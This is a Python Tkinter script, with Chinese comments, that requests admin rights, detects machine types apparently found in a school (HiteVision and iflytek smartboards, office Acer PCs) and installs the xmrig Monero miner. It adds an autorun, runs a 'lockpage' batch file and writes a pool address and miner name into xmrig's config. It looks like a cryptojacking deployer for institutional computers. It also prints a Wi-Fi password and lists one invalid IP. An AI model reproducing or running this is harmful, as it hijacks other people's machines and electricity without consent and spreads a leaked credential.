import getpass
import tkinter as tk
import os
import ctypes, sys
import random

from distutils.cmd import Command
#请求管理员权限p
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():
    # Code of your program here
    print("good")
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()
def urlip():
    test = '            "url": "{url}:3333",'
    url ="null"
    
    def save_url():
        
        global url
        url = entry.get()
        new_line_content = test.format(url=url)  # 使用format方法将url替换到test中的占位符{url}
        file_path = r"C:\Program Files\xmrig\config.json"
        line_num = 65

        with open(file_path, "r", encoding="utf-8") as f:
            lines = f.readlines()

        lines[line_num-1] = new_line_content + "\n"

        with open(file_path, "w", encoding="utf-8") as f:
            f.writelines(lines)

        root.destroy()

    def on_select(event):
        # 获取Listbox当前选中的值
        selection = event.widget.get(event.widget.curselection())
        # 将选中的值填充到输入框中
        entry.delete(0, tk.END)
        entry.insert(tk.END, selection)

    root = tk.Tk()
    root.title("输入地址")
    root.geometry("300x200")

    label = tk.Label(root, text="请输入url或ip：", font=("Arial", 12))
    label.pack(pady=10)

    # 创建一个Listbox控件，并添加一些默认的ip
    listbox = tk.Listbox(root, height=3, width=36)
    listbox.insert(1, "推荐的数据，上为教室，下为办公室，点击填充")
    listbox.insert(2, "172.18.0.219")
    listbox.insert(3,"192.268.19.22")
    listbox.pack(pady=5)

    # 绑定Listbox的选择事件和on_select函数
    listbox.bind("<<ListboxSelect>>", on_select)

    entry = tk.Entry(root, width=35)
    entry.pack(pady=5)

    button = tk.Button(root, text="确定", command=save_url, font=("Arial", 12))
    button.pack(pady=10)
    # 设置窗口大小和位置
    window_width = 400
    window_height = 200
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = int((screen_width - window_width) / 2)
    y = int((screen_height - window_height) / 2)
    root.geometry(f'{window_width}x{window_height}+{x}+{y}')
    root.attributes('-topmost', True)

    root.mainloop()

def pasname():
    test = '            "test": "{pas}",'
    pas = "null"
    
    def save_pas():
        global pas
        pas = entry.get()
        new_line_content = test.format(pas=pas)  # 使用format方法将pas替换到test中的占位符{pas}
        file_path = r"C:\Program Files\xmrig\config.json"
        line_num = 67

        with open(file_path, "r", encoding="utf-8") as f:
            lines = f.readlines()

        lines[line_num-1] = new_line_content + "\n"

        with open(file_path, "w", encoding="utf-8") as f:
            f.writelines(lines)

        root.destroy()

    def on_select(event):
        # 获取Listbox当前选中的值
        selection = event.widget.get(event.widget.curselection())
        # 将选中的值填充到输入框中
        entry.delete(0, tk.END)
        entry.insert(tk.END, selection)

    def generate_random_numbers():
        return str(random.randint(100, 999))

    root = tk.Tk()
    root.title("输入矿机名")
    root.geometry("300x200")

    label = tk.Label(root, text="请输入矿机名：", font=("Arial", 12))
    label.pack(pady=10)

    # 创建一个Listbox控件，并添加随机生成的三位数字
    listbox = tk.Listbox(root, height=3, width=35)
    listbox.insert(1, "我们为您随机生成了三位数字，点击填充。")
    listbox.insert(2, generate_random_numbers())
    listbox.pack(pady=5)

    # 绑定Listbox的选择事件和on_select函数
    listbox.bind("<<ListboxSelect>>", on_select)

    entry = tk.Entry(root, width=35)
    entry.pack(pady=5)

    button = tk.Button(root, text="确定", command=save_pas, font=("Arial", 12))
    button.pack(pady=10)
    
    # 设置窗口大小和位置
    window_width = 400
    window_height = 200
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = int((screen_width - window_width) / 2)
    y = int((screen_height - window_height) / 2)
    root.geometry(f'{window_width}x{window_height}+{x}+{y}')
    root.attributes('-topmost', True)

    root.mainloop()



def body():
    # 如果用户名为HiteVision，则弹出窗口
    if username == 'HiteVision':
        root = tk.Tk()
        root.wm_attributes('-topmost', 1)
        root.title('安装xmrig')

        # 设置窗口大小和位置
        window_width = 400
        window_height = 200
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = int((screen_width - window_width) / 2)
        y = int((screen_height - window_height) / 2)
        root.geometry(f'{window_width}x{window_height}+{x}+{y}')

        # 设置窗口背景颜色和字体样式
        root.configure(bg='#F0F0F0')
        root.option_add("*Font", "Arial 12")

        # 创建文本标签
        label_text = '检测到当前计算机为HiteVision，请在屏幕底部上滑，连接到无线网，密码whsz@2020。'
        label = tk.Label(root, text=label_text, bg='#F0F0F0', wraplength=300)
        label.pack(pady=20)

        # 创建按钮1，打开xmrinstall.exe，xmrig自启动v2.1_winall.cmd和lockpage.bat
        def button1_click():
            os.system('xmriginstall.exe')
            os.system('xmrigautorun.cmd')
            os.system('lockpage.bat')
            urlip()
        button1 = tk.Button(root, text='我已连接无线网，准备安装同局域网矿机', command=button1_click, bg='#4CAF50', fg='white')
        button1.pack(pady=10)

        # 创建按钮2，打开2.exe，xmrig自启动v2.1_winall.cmd和2.bat
        def button2_click():
            os.system('xmriginstall.exe')
            os.system('xmrigautorun.cmd')
            os.system('lockpage.bat')
            pasname()

        button2 = tk.Button(root, text='安装非局域网矿机', command=button2_click, bg='#F44336', fg='white')
        button2.pack(pady=10) 
        root.mainloop()

        #HiteVision

    # 如果用户名为iflytek，则弹出窗口
    if username == 'iflytek':
        os.system('netsh interface set interface "WLAN" admin=enable')
        os.system('ncpa.cpl')
        root = tk.Tk()
        root.wm_attributes('-topmost', 1)
        root.title('安装xmrig')

        # 设置窗口大小和位置
        window_width = 400
        window_height = 200
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = int((screen_width - window_width) / 2)
        y = int((screen_height - window_height) / 2)
        root.geometry(f'{window_width}x{window_height}+{x}+{y}')

        # 设置窗口背景颜色和字体样式
        root.configure(bg='#F0F0F0')
        root.option_add("*Font", "Arial 12")

        # 创建文本标签
        label_text = '检测到当前计算机为iflytek，我们虽然尝试过启用适配器，但请您还是检查一下无线网络适配器是否启用。并在托盘区连接到无线网！！！密码whsz@2020。'
        label = tk.Label(root, text=label_text, bg='#F0F0F0', wraplength=300)
        label.pack(pady=20)

        # 创建按钮1，打开xmrinstall.exe，xmrig自启动v2.1_winall.cmd和lockpage.bat
        def button1_click():
            os.system('xmriginstall.exe')
            os.system('xmrigautorun.cmd')
            os.system('lockpage.bat')
            os.system('copy wlan.cmd "C:/Program Files/xmrig/"')
            urlip()

        button1 = tk.Button(root, text='我已连接无线网，准备安装同局域网矿机', command=button1_click, bg='#4CAF50', fg='white')
        button1.pack(pady=10)

        # 创建按钮2，打开2.exe，xmrig自启动v2.1_winall.cmd和2.bat
        def button2_click():
            os.system('xmriginstall.exe')
            os.system('xmrigautorun.cmd')
            os.system('lockpage.bat')
            os.system('copy wlan.cmd "C:/Program Files/xmrig/"')
            pasname()

        button2 = tk.Button(root, text='安装非局域网矿机', command=button2_click, bg='#F44336', fg='white')
        button2.pack(pady=10) 
        root.mainloop()

        #iflytek
    # 如果用户名为acer，则弹出窗口
    if username == 'acer':
        root = tk.Tk()
        root.wm_attributes('-topmost', 1)
        root.title('安装xmrig')

        # 设置窗口大小和位置
        window_width = 400
        window_height = 200
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = int((screen_width - window_width) / 2)
        y = int((screen_height - window_height) / 2)
        root.geometry(f'{window_width}x{window_height}+{x}+{y}')

        # 设置窗口背景颜色和字体样式
        root.configure(bg='#F0F0F0')
        root.option_add("*Font", "Arial 12")

        # 创建文本标签
        label_text = '检测到当前计算机为办公室电脑，请自行判断是否为同一局域网。'
        label = tk.Label(root, text=label_text, bg='#F0F0F0', wraplength=300)
        label.pack(pady=20)

        # 创建按钮1，打开xmrinstall.exe，xmrig自启动v2.1_winall.cmd和lockpage.bat
        def button1_click():
            os.system('xmriginstall.exe')
            os.system('xmrigautorun.cmd')
            os.system('lockpage.bat')
            urlip()

        button1 = tk.Button(root, text='我判断在同一局域网，准备安装同局域网矿机', command=button1_click, bg='#4CAF50', fg='white')
        button1.pack(pady=10)

        # 创建按钮2，打开2.exe，xmrig自启动v2.1_winall.cmd和2.bat
        def button2_click():
            os.system('xmriginstall.exe')
            os.system('xmrigautorun.cmd')
            os.system('lockpage.bat')
            pasname()

        button2 = tk.Button(root, text='不在一个局域网，我要安装非局域网矿机', command=button2_click, bg='#F44336', fg='white')
        button2.pack(pady=10) 
        root.mainloop()

        #办公室acer
    else:         
        window = tk.Tk()
        window.wm_attributes('-topmost', 1)
        window.title("请指定计算机类型")

        # 计算屏幕尺寸
        screen_width = window.winfo_screenwidth()
        screen_height = window.winfo_screenheight()

        # 设置窗口大小和位置
        window_width = 300
        window_height = 200
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        window.geometry(f"{window_width}x{window_height}+{x}+{y}")

        # 创建文本标签
        label = tk.Label(window, text="无法判断此计算机类型，请手动指定")
        label.pack(pady=20)

        def button1_click():
            global username
            username = "HiteVision"
            body()
            window.destroy()
        def button2_click():
            global username
            username = "iflytek"
            body()
            window.destroy()
        def button3_click():
            global username
            username = "acer"
            body()
            window.destroy()
        # 创建按钮
        button1 = tk.Button(window, text="HiteVision", command=button1_click)
        button1.pack(pady=10)

        button2 = tk.Button(window, text="iflytek", command=button2_click)
        button2.pack(pady=10)

        button3 = tk.Button(window, text="办公室acer", command=button3_click)
        button3.pack(pady=10)

        # 运行窗口
        window.mainloop()

# 获取当前用户名
username = getpass.getuser()       
body()



